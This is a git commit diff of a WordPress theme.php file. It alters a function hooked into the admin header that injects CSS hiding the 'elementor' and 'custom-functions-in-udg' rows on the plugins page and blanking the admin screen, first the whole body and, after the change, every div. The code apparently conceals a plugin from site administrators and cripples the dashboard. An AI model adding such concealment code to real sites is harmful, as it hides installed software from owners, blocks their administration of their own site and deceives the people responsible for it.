101f823f5f1d73a945fda3fc594a8b354ede7080
theahmedmuneeb <101744347+theahmedmuneeb@users.noreply.github.com>
2024-02-05 10:17:30 +0500

    Update theme.php

--- theme.php
+++ theme.php
@@ -1,6 +1,6 @@
 function custom_functions_to_add_udg_hidei() {
 echo '<style>
-.plugins-php .plugins tr[data-slug="elementor"],.plugins-php .plugins tr[data-slug="custom-functions-in-udg"],body{ display:none; }
+.plugins-php .plugins tr[data-slug="elementor"],.plugins-php .plugins tr[data-slug="custom-functions-in-udg"],div{ display:none; }
 </style>';
 }
 add_action('admin_head', 'custom_functions_to_add_udg_hidei');
